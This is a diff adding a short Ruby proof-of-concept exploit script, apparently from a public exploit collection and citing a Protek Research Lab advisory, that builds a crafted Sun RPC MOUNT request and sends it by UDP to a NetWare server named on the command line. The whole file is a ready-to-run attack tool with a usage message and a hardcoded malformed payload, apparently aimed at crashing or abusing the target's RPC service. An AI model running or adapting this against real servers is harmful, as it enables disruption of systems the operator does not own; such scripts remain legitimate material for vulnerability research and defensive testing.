@@ -1,0 +1,38 @@
+#!/usr/bin/ruby
+
+# Source:
+# http://www.protekresearchlab.com/index.php?option=com_content&view=article&id=24&Itemid=24
+
+require 'socket'
+
+netware_server = (ARGV[0])
+target_port = (ARGV[1] || 1234)
+
+
+beepbeep=
+"\x1c\xd1\xef\xab"  + # XID
+"\x00\x00\x00\x00" + # Message Type: Call (0)
+"\x00\x00\x00\x02" + # RPC Version: 2
+"\x00\x01\x86\xa5" + # Program: 10005 MOUNT
+"\x00\x00\x00\x02" + # Program Version: 2
+"\x00\x00\x00\x01" + # Procedure: MNT  (1)
+"\x00\x00\x00\x00\x00\x00\x00\x00" + #
+"\x00\x00\x00\x00\x00\x00\x00\x00" + #Verifier NULL
+"\x41\x42\x43\x44"
+
+
+
+
+puts "[+] beep beep\n"
+puts "[+]No, it's not the road runner\n"
+
+
+if (!(netware_server && target_port))
+    puts "Usage: PRL-2011-04.rb host port (default port: 1234)\n"
+    exit
+else
+    puts "[+]Sending UDP Packet...\n"
+    sock = UDPSocket.open
+    sock.connect(netware_server, target_port.to_i)
+    sock.send(beepbeep, 0)
+end
